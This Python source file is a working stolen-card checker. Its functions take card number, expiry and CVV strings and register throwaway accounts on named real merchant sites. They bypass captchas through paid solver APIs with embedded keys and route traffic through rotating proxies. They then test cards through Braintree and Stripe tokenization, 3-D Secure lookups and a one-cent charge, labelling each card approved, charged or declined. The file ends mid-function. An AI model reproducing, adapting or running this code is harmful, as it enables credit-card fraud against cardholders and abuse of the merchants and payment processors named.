import requests
import re
import random
import time
import string
import base64
from bs4 import BeautifulSoup
import uuid
from faker import Faker
import cloudscraper
import user_agent
import json
import requests
import time
import base64
from bs4 import BeautifulSoup
import uuid
import re
from faker import Faker
import random
import json
import user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
def Tele(ccx):
	def getstr(text: str, a: str, b: str) -> str:
	    try:
	        return text.split(a)[1].split(b)[0]
	    except IndexError:
	        return None
########################Generate Fake Gmail####################
	corr = str(uuid.uuid4())
	corrr = corr
	fake = Faker()
	username = fake.user_name()
	number = fake.random_int(min=100, max=9999)
	email = f"{username}{number}@gmail.com"
	def generate_random_numbers():
	    numbers = f"{random.randint(400000, 599999):010d}"
	    return numbers
	random_numbers = generate_random_numbers()
	###############################################################
	def captcha():
	    API_KEY = "CP_8qd6BbhjjvUx9LXrkQ1XZw9r9cM1PtyR4j68cJkpRbCp"
	    SITE_KEY = "a20eeeca-0bdc-46bc-aab4-67403fa8c212"
	    SITE_URL = "https://mpug.com/my-account/"
	    url = "https://v1.captchaly.com/hcaptcha"
	    headers = {
	        "Authorization": f"Bearer {API_KEY}"
	    }
	    params = {
	        "sitekey": SITE_KEY,
	        "url": SITE_URL
	    }
	    while True:
	        try:
	            response = requests.get(url, headers=headers, params=params)
	            if response.status_code == 200:
	                result = response.json()
	                token = result.get("token")
	                if token:
	                    return token
	        except:
	            pass
	        time.sleep(1)
	###################################################################################################################
	token = captcha()
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	corr = str(uuid.uuid4())
	coder = requests.session()
	###########################Start Get Sign UP Nonce###########################
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
	}
	response = coder.get('https://mpug.com/my-account/', headers=headers)
	soup = BeautifulSoup(response.text, "html.parser")
	nonce_input = soup.find("input", {"name": "woocommerce-register-nonce"})
	nonce_value = nonce_input.get("value")
	#######################################################
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'origin': 'https://mpug.com',
	    'referer': 'https://mpug.com/my-account/',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
	}
	data = {
	    'email': email,
	    'g-recaptcha-response': token,
	    'h-captcha-response': token,
	    'wc_order_attribution_session_entry': 'https://mpug.com/my-account/add-payment-method/',
	    'wc_order_attribution_session_start_time': '2025-05-31 17:43:34',
	    'woocommerce-register-nonce': nonce_value,
	    '_wp_http_referer': '/my-account/',
	    'register': 'Register',
	}
	response = coder.post('https://mpug.com/my-account/', headers=headers, data=data)
	#################################################################################################
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
	}
	response = coder.get('https://mpug.com/my-account/edit-address/billing/', headers=headers)
	soup = BeautifulSoup(response.text, "html.parser")
	nonce_input = soup.find("input", {"name": "woocommerce-edit-address-nonce"})
	nonce_value1 = nonce_input.get("value")
	#################################################################################################
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
	}
	data = {
	    'billing_first_name': '3MO',
	    'billing_last_name': 'Coder',
	    'billing_company': '3MO Coder',
	    'billing_country': 'US',
	    'billing_address_1': '50 Summer St',
	    'billing_address_2': '#',
	    'billing_city': 'Adams',
	    'billing_state': 'NY',
	    'billing_postcode': '10080',
	    'billing_phone': '+204137439725',
	    'billing_email': email,
	    'woocommerce-edit-address-nonce': nonce_value1,
	    '_wp_http_referer': '/my-account/edit-address/billing/',
	    'action': 'edit_address',
	    'save_address': 'Save address',
	}
	response = coder.post('https://mpug.com/my-account/edit-address/billing/', headers=headers, data=data)
	##################################################################################################
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
	}
	response = coder.get('https://mpug.com/my-account/add-payment-method/', headers=headers)
	nonce = getstr(response.text,' name="woocommerce-add-payment-method-nonce" value="','"')
	clinet = getstr(response.text,'"paypal","client_token_nonce":"','"')
	headers = {
	    'accept': '*/*',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://mpug.com',
	    'referer': 'https://mpug.com/my-account/add-payment-method/',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	data = {
	    'action': 'wc_braintree_paypal_get_client_token',
	    'nonce': clinet,
	}
	response = coder.post('https://mpug.com/wp-admin/admin-ajax.php', headers=headers, data=data)
	b_token_encrypted = response.json()['data']
	b_token_decrypted = str(base64.b64decode(b_token_encrypted))
	btoken = getstr(b_token_decrypted, '"authorizationFingerprint":"', '","')
	b_token = "Bearer "+btoken
	merchantId = getstr(b_token_decrypted, 'merchantId":"', '","')
	###################################################################################################
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'authorization': b_token,
	    'braintree-version': '2018-05-10',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	token_bc = getstr(response.text, '"token":"', '"')
	##########################################################################################################
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
	}
	data = [
	    ('payment_method', 'braintree_credit_card'),
	    ('wc-braintree-credit-card-card-type', 'master-card'),
	    ('wc-braintree-credit-card-3d-secure-enabled', ''),
	    ('wc-braintree-credit-card-3d-secure-verified', ''),
	    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
	    ('wc_braintree_credit_card_payment_nonce', token_bc),
	    ('wc_braintree_device_data', '{"correlation_id":"' + corrr + '"}'),
	    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
	    ('wc_braintree_paypal_payment_nonce', ''),
	    ('wc_braintree_device_data', '{"correlation_id":"' + corrr + '"}'),
	    ('wc-braintree-paypal-context', 'shortcode'),
	    ('wc_braintree_paypal_amount', '0.00'),
	    ('wc_braintree_paypal_currency', 'USD'),
	    ('wc_braintree_paypal_locale', 'en_us'),
	    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
	    ('woocommerce-add-payment-method-nonce', nonce),
	    ('_wp_http_referer', '/my-account/add-payment-method/'),
	    ('woocommerce_add_payment_method', '1'),
	]
	response = coder.post('https://mpug.com/my-account/add-payment-method/', headers=headers, data=data)
	text = response.text
	pattern = r'Status code\s*(?:\d+\s*:\s*)?([^<]+)\s*</li>\s*</ul>'
	match = re.search(pattern, text)
	if match:
		last = match.group(1).strip()
		if 'risk_threshold' in last:
			return "RISK: Retry this BIN later."
		elif 'Nice! New payment method added' in last or 'Payment method successfully added.' in last:
			return 'Approved'
		elif 'Duplicate card exists in the vault.' in last:
			return 'Approved'
		elif 'Cannot Authorize at this time (Policy) (51 : TRY AGAIN LATER)' in last:
			return 'Cannot Authorize at this time (Policy)'
		elif 'Cannot Authorize at this time (Policy) (51 : NEW ACCOUNT INFO)' in last:
			return 'Cannot Authorize at this time (Policy)'
		elif 'Cannot Authorize at this time (Life cycle) (51 : TRY AGAIN LATER)' in last:
			return 'Cannot Authorize at this time (Life cycle)'
		elif 'Declined (51 : DECLINED)' in last:
			return 'Declined'
		elif 'Declined - Call Issuer (51 : DO NOT TRY AGAIN)' in last:
			return 'Declined - Call Issuer'
		elif 'Processor Declined (14 : INV ACCT NUM)' in last:
			return 'Processor Declined'
		elif "Card Issuer Declined CVV" in last:
			return 'Approved (CCN)'
		else:
			return last
	else:
		return 'Erroooooooor'
def passed(card):
    ########################Generate Fake Gmail####################
	def generate_random_numbers():
	    numbers = f"{random.randint(400000, 599999):010d}"
	    return numbers
	random_numbers = generate_random_numbers()
	corr = str(uuid.uuid4())
	fake = Faker()
	username = fake.user_name()
	number = fake.random_int(min=100, max=9999)
	email = f"{username}{number}@gmail.com"
	scraper = cloudscraper.create_scraper()
	user = user_agent.generate_user_agent()
	#print(email)
	###############################################################
	card=card.strip()
	n = card.split("|")[0]
	mm = card.split("|")[1]
	yy = card.split("|")[2]
	cvc = card.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	corr = str(uuid.uuid4())
	########################Generate Fake Gmail####################
	with open("coder.txt", "r") as f:
		lines = f.read().splitlines()
	selected = random.choice(lines)
	host, port = selected.strip().split(":")
	proxy_auth = f"{host}:{port}"
	proxies = {
	    "http": f"http://{proxy_auth}",
	    "https": f"http://{proxy_auth}",
	}
	#print(f"DEBUG: Using proxy for card {card.strip()[:6]}... : {selected_proxy}")
	scraper = cloudscraper.create_scraper()
	user = user_agent.generate_user_agent()
	coder = requests.session()
	###############################################################
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'origin': 'https://3dmodels.org',
	    'referer': 'https://3dmodels.org/3d-models/food/',
	    'User-Agent': user,
	}
	data = {
	    'post_id': '300195',
	    'action': 'popup_cart',
	    'listtocart': '1',
	}
	response = scraper.post('https://3dmodels.org/wp-admin/admin-ajax.php', headers=headers, data=data, proxies=proxies, timeout=60)
	#################################################################################################################
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'origin': 'https://3dmodels.org',
	    'referer': 'https://3dmodels.org/3d-models/food/',
	    'User-Agent': user,
	}
	data = {
	    'action': 'get_just_bougth_box',
	}
	response = scraper.post('https://3dmodels.org/wp-admin/admin-ajax.php', headers=headers, data=data, proxies=proxies, timeout=60)
	#######################################################################################################################
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'referer': 'https://3dmodels.org/3d-models/food/',
	}
	response = scraper.get('https://3dmodels.org/shopping-cart/checkout/', headers=headers, proxies=proxies, timeout=60)
	#####################################################################################################################################
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'origin': 'https://3dmodels.org',
	    'referer': 'https://3dmodels.org/shopping-cart/checkout/',
	    'User-Agent': user,
	}
	data = {
	    'first_name': '3MO',
	    'last_name': 'Coder',
	    'email': email,
	    'understand': '',
	    'eshop_payment': 'braintree',
	    'eshop_users': '1',
	    'amount': '5.00',
	    'submit_checkout': 'checkout',
	    'submit': 'Next',
	}
	response = scraper.post('https://3dmodels.org/shopping-cart/checkout/', headers=headers, data=data, proxies=proxies, timeout=60)
	soup = BeautifulSoup(response.text, "html.parser")
	scripts = soup.find_all("script")
	for script in scripts:
	    if script.string and "bt_token_nonce" in script.string:
	        match = re.search(r'"bt_token_nonce"\s*:\s*"([a-zA-Z0-9]+)"', script.string)
	        if match:
	            nonce_value1 = match.group(1)
	            break
	####################################################################################################
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'referer': 'https://3dmodels.org/shopping-cart/checkout/',
	    'X-Requested-With': 'XMLHttpRequest',
	    'User-Agent': user,
	}
	
	params = {
	    'action': 'token_braintree',
	    'nonce': nonce_value1,
	    'merchant': '1',
	}
	
	response = scraper.get('https://3dmodels.org/wp-admin/admin-ajax.php', params=params, headers=headers, proxies=proxies, timeout=60)
	response1 = response.text
	data = json.loads(response1)
	token = data.get("token")
	if token:
	    missing_padding = len(token) % 4
	    if missing_padding:
	        token += '=' * (4 - missing_padding)
	    try:
	        decoded = base64.b64decode(token).decode('utf-8')
	        decoded_data = json.loads(decoded)
	        auth_fingerprint = decoded_data.get("authorizationFingerprint")
	    except Exception as e:
	        print("حدث خطأ أثناء فك التشفير:", e)
	else:
	    print("لم يتم العثور على 'token' في الاستجابة.")
	####################################################################################################
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'authorization': f'Bearer {auth_fingerprint}',
	    'braintree-version': '2018-05-10',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'User-Agent': user,
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!, $authenticationInsightInput: AuthenticationInsightInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }     authenticationInsight(input: $authenticationInsightInput) {      customerAuthenticationRegulationEnvironment    }  } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	        'authenticationInsightInput': {
	            'merchantAccountId': 'payparaartcom',
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = scraper.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, proxies=proxies, timeout=60)
	tok=response.json()['data']['tokenizeCreditCard']['token']
	######################################################################################################
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'origin': 'https://3dmodels.org',
	    'referer': 'https://3dmodels.org/',
	    'User-Agent': user,
	}
	
	json_data = {
	    'amount': '5.00',
	    'browserColorDepth': 24,
	    'browserJavaEnabled': False,
	    'browserJavascriptEnabled': True,
	    'browserLanguage': 'en-US',
	    'browserScreenHeight': random.randint(600, 1080),
	    'browserScreenWidth': random.randint(300, 1920),
	    'browserTimeZone': random.choice([-120, -60, 0, 60, 120]),
	    'deviceChannel': 'Browser',
	    'additionalInfo': {
	        'billingPhoneNumber': '14665792313',
	        'billingGivenName': '3MO',
	        'billingSurname': 'Coder',
	        'email': email,
	    },
	    #'bin': random_numbers,
	    'dfReferenceId': f'0_{corr}',
	    'clientMetadata': {
	        'requestedThreeDSecureVersion': '2',
	        'sdkVersion': 'web/3.103.0',
	        'cardinalDeviceDataCollectionTimeElapsed': random.randint(100, 1000),
	        'issuerDeviceDataCollectionTimeElapsed': random.randint(1000, 5000),
	        'issuerDeviceDataCollectionResult': True,
	    },
	    'authorizationFingerprint': auth_fingerprint,
	    'braintreeLibraryVersion': 'braintree/web/3.103.0',
	    '_meta': {
	        'merchantAppId': '3dmodels.org',
	        'platform': 'web',
	        'sdkVersion': '3.103.0',
	        'source': 'client',
	        'integration': 'custom',
	        'integrationType': 'custom',
	    },
	}
	response = scraper.post(
	    f'https://api.braintreegateway.com/merchants/np36c2tr5dtm362n/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
	    headers=headers,
	    json=json_data,
	    proxies=proxies,
	    timeout=60
	)
	vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
	if 'authenticate_successful' in vbv:
	   return '3DS Authenticate Successful'
	elif 'challenge_required' in vbv:
	   return '3DS Challenge Required'
	elif 'authenticate_attempt_successful' in vbv:
	   return '3DS Authenticate Attempt Successful'
	elif 'authenticate_rejected' in vbv:
	   return '3DS Authenticate Rejected'
	elif 'authenticate_frictionless_failed' in vbv:
	   return '3DS Authenticate Frictionless Failed'
	elif 'lookup_card_error' in vbv:
	   return 'lookup_card_error ⚠'
	elif 'lookup_error' in vbv:
	   return 'Unknown Error ⚠️'
	else:
	   return vbv
def stripeauth(card1):
	fake = Faker()
	username = fake.user_name()
	number = fake.random_int(min=100, max=9999)
	email = f"{username}{number}@gmail.com"
	card1=card1.strip()
	n = card1.split("|")[0]
	mm = card1.split("|")[1]
	yy = card1.split("|")[2]
	cvc = card1.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	coder = requests.session()
	headers = {
	    'authority': 'shop.wiseacrebrew.com',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'referer': 'https://shop.wiseacrebrew.com/',
	}
	response = coder.get('https://shop.wiseacrebrew.com/account/', headers=headers)
	register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
	####
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'origin': 'https://shop.wiseacrebrew.com',
	    'referer': 'https://shop.wiseacrebrew.com/account/',
	}
	data = {
	    'email': email,
	    'password': email,
	    'wc_order_attribution_source_type': 'typein',
	    'wc_order_attribution_referrer': '(none)',
	    'wc_order_attribution_utm_campaign': '(none)',
	    'wc_order_attribution_utm_source': '(direct)',
	    'wc_order_attribution_utm_medium': '(none)',
	    'wc_order_attribution_utm_content': '(none)',
	    'wc_order_attribution_utm_id': '(none)',
	    'wc_order_attribution_utm_term': '(none)',
	    'wc_order_attribution_utm_source_platform': '',
	    'wc_order_attribution_utm_creative_format': '',
	    'wc_order_attribution_utm_marketing_tactic': '',
	    'wc_order_attribution_session_entry': 'https://shop.wiseacrebrew.com/',
	    'wc_order_attribution_session_start_time': '2025-06-07 18:43:25',
	    'wc_order_attribution_session_pages': '3',
	    'wc_order_attribution_session_count': '1',
	    'woocommerce-register-nonce': register,
	    '_wp_http_referer': '/account/',
	    'register': 'Register',
	}
	response = coder.post('https://shop.wiseacrebrew.com/account/', headers=headers, data=data)
	####
	headers = {
	    'authority': 'shop.wiseacrebrew.com',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'referer': 'https://shop.wiseacrebrew.com/account/',
	}
	response = coder.get('https://shop.wiseacrebrew.com/account/payment-methods/', headers=headers)
	nonce = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', response.text).group(1)
	key = re.search(r'"key":"(.*?)"', response.text).group(1)
	###
	headers = {
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	}
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&pasted_fields=number&payment_user_agent=stripe.js%2Fc0b5539ba7%3B+stripe-js-v3%2Fc0b5539ba7%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fshop.wiseacrebrew.com&time_on_page=41050&client_attribution_metadata[client_session_id]=fe694e00-cee6-4ed5-a5ed-19304ce71e47&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=NA&muid=NA&sid=NA&key={key}&_stripe_version=2024-06-20'
	response = coder.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	tok = response.json()['id']
	###
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'origin': 'https://shop.wiseacrebrew.com',
	    'referer': 'https://shop.wiseacrebrew.com/account/add-payment-method/',
	    'x-requested-with': 'XMLHttpRequest',
	}
	params = {
	    'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
	}
	data = {
	    'action': 'create_and_confirm_setup_intent',
	    'wc-stripe-payment-method': tok,
	    'wc-stripe-payment-type': 'card',
	    '_ajax_nonce': nonce,
	}
	response = coder.post('https://shop.wiseacrebrew.com/', params=params, headers=headers, data=data)
	if '"success":true,"data":{"status":"succeeded"' in response.text:
	    return 'Your Payment Method Successfully Added.'
	else:
	    return 'Your card has been declined.'
def fuck(carddddd):
	fake = Faker()
	username = fake.user_name()
	number = fake.random_int(min=100, max=9999)
	email = f"{username}{number}@gmail.com"
	carddddd=carddddd.strip()
	n = carddddd.split("|")[0]
	mm = carddddd.split("|")[1]
	yy = carddddd.split("|")[2]
	cvc = carddddd.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	coder = requests.session()
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	}
	response = coder.get('https://houseofkorea.co.uk/my-account/payment-methods/', headers=headers)
	reg_nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
	#################################
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'origin': 'https://houseofkorea.co.uk',
	    'referer': 'https://houseofkorea.co.uk/my-account/payment-methods/',
	}
	data = {
	    'email': email,
	    'wc_order_attribution_source_type': 'typein',
	    'wc_order_attribution_referrer': '(none)',
	    'wc_order_attribution_utm_campaign': '(none)',
	    'wc_order_attribution_utm_source': '(direct)',
	    'wc_order_attribution_utm_medium': '(none)',
	    'wc_order_attribution_utm_content': '(none)',
	    'wc_order_attribution_utm_id': '(none)',
	    'wc_order_attribution_utm_term': '(none)',
	    'wc_order_attribution_utm_source_platform': '(none)',
	    'wc_order_attribution_utm_creative_format': '(none)',
	    'wc_order_attribution_utm_marketing_tactic': '(none)',
	    'wc_order_attribution_session_entry': 'https://houseofkorea.co.uk/my-account/payment-methods/',
	    'wc_order_attribution_session_start_time': '2025-06-09 22:52:21',
	    'wc_order_attribution_session_pages': '1',
	    'wc_order_attribution_session_count': '1',
	    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
	    'woocommerce-register-nonce': reg_nonce,
	    '_wp_http_referer': '/my-account/payment-methods/',
	    'register': 'Register',
	}
	response = coder.post('https://houseofkorea.co.uk/my-account/payment-methods/', headers=headers, data=data)
	nonce = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', response.text).group(1)
	pk = re.search(r'"key":"(.*?)"', response.text).group(1)
	########
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'referer': 'https://houseofkorea.co.uk/my-account/payment-methods/',
	}
	
	response = coder.get(
	    'https://houseofkorea.co.uk/my-account/add-payment-method/',
	    headers=headers,
	)
	########
	headers = {
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'priority': 'u=1, i',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Windows"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
	}
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&pasted_fields=number&payment_user_agent=stripe.js%2F0089f5e1e2%3B+stripe-js-v3%2F0089f5e1e2%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fhouseofkorea.co.uk&time_on_page=98279&client_attribution_metadata[client_session_id]=c420c59e-e6b3-4096-b08e-2e2e8eec92a4&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=d5848c90-3b00-4e8f-8319-abca0d47d3ba0003a1&muid=e61abf1d-187e-499c-ac7a-4d47e3ef0c32ca2604&sid=00187bd1-3d02-498b-8fda-4d66bdf0d983c3dd3c&key={pk}&_stripe_version=2024-06-20'
	
	response = coder.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	tok = response.json()['id']
	##########
	headers = {
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://houseofkorea.co.uk',
	    'priority': 'u=1, i',
	    'referer': 'https://houseofkorea.co.uk/my-account/add-payment-method/',
	    'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Windows"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	params = {
	    'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
	}
	data = {
	    'action': 'create_and_confirm_setup_intent',
	    'wc-stripe-payment-method': tok,
	    'wc-stripe-payment-type': 'card',
	    '_ajax_nonce': nonce,
	}
	response = coder.post('https://houseofkorea.co.uk/', params=params, headers=headers, data=data)
	msg=response.text
	if '"success":true,"data":{"status":"succeeded"' in msg:
	    return 'Your Payment Method Successfully Added.'
	else:
	    return 'Your card has been declined.'
def brchargeeee(card2):
	def generate_random_numbers():
	    numbers = f"{random.randint(400000, 599999):010d}"
	    return numbers
	random_numbers = generate_random_numbers()
	user = user_agent.generate_user_agent()
	corr = str(uuid.uuid4())
	fake = Faker()
	coder = requests.session()
	username = fake.user_name()
	username2 = fake.user_name()
	username3 = fake.user_name()
	number = fake.random_int(min=100, max=9999)
	area_code = random.randint(100, 999)
	prefix = random.randint(100, 999)
	line_number = random.randint(1000, 9999)
	phone_number = f"({area_code}) {prefix}-{line_number}"
	email = f"{username}{number}@gmail.com"
	card2=card2.strip()
	n = card2.split("|")[0]
	mm = card2.split("|")[1]
	#mm = mm.lstrip("0")
	yy = card2.split("|")[2]
	cvc = card2.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	######################### Captcha Solve #############################
	def captcha():
	    import logging
	    from nextcaptcha import NextCaptchaAPI
	    logging.getLogger().setLevel(logging.WARNING)
	    CLIENT_KEY = "next_1cf523cdb5cf4271e91e393bf06316f46a"
	    WEBSITE_URL = "https://agurgentcare.com/make-payment/"
	    WEBSITE_KEY = "6Ld_DT8eAAAAAKxhMeZaBcVVYl-QePzVaR46NuYn"
	    api = NextCaptchaAPI(client_key=CLIENT_KEY)
	    result = api.recaptchav2(website_url=WEBSITE_URL, website_key=WEBSITE_KEY)
	    if result["status"] == "ready":
	        return result["solution"]["gRecaptchaResponse"]
	    else:
	        return None
	######################### End Captcha Solve #############################
	#####################################################################
	headers = {
	    'accept-language': 'en-US,en;q=0.9',
	    'user-agent': user,
	}
	response = coder.get('https://agurgentcare.com/make-payment/', headers=headers)
	state_6 = re.search(r"name='state_6' value='(.*?)'", response.text).group(1)
	version_hash = re.search(r'"version_hash":"(.*?)"', response.text).group(1)
	#####################################################################
	data = MultipartEncoder({
	    ('input_1.3', (None, username)),
	    ('input_1.6', (None, username2)),
	    ('input_2', (None, phone_number)),
	    ('input_3', (None, email)),
	    ('input_9', (None, '')),
	    ('input_5', (None, '$0.01')),
	    ('input_8.1', (None, n)),
	    ('input_8.2[]', (None, mm)),
	    ('input_8.2[]', (None, yy)),
	    ('input_8.3', (None, cvc)),
	    ('input_8.5', (None, username3)),
	    ('input_10.1', (None, 'Alex18')),
	    ('input_10.2', (None, '')),
	    ('input_10.3', (None, 'NewYork')),
	    ('input_10.4', (None, 'New York')),
	    ('input_10.5', (None, '10080')),
	    ('input_10.6', (None, 'United States')),
	    ('input_12', (None, '')),
	    ('g-recaptcha-response', (None, captcha())),
	    ('gform_submission_method', (None, 'postback')),
	    ('gform_theme', (None, 'gravity-theme')),
	    ('gform_style_settings', (None, '[]')),
	    ('is_submit_6', (None, '1')),
	    ('gform_submit', (None, '6')),
	    ('gform_unique_id', (None, '')),
	    ('state_6', (None, state_6)),
	    ('gform_target_page_number_6', (None, '0')),
	    ('gform_source_page_number_6', (None, '1')),
	    ('gform_field_values', (None, '')),
	    ('version_hash', (None, version_hash)),
	})
	headers = {
	    'accept-language': 'en-US,en;q=0.9',
	    'Content-Type': data.content_type,
	    'origin': 'https://agurgentcare.com',
	    'referer': 'https://agurgentcare.com/make-payment/',
	    'user-agent': user,
	}
	response = coder.post('https://agurgentcare.com/make-payment/', headers=headers, data=data)
	#print(response.status_code)
	if response.url.rstrip('/') == "https://agurgentcare.com/appointment-request-confirmation-2-2":
	    return 'Charge'
	else:
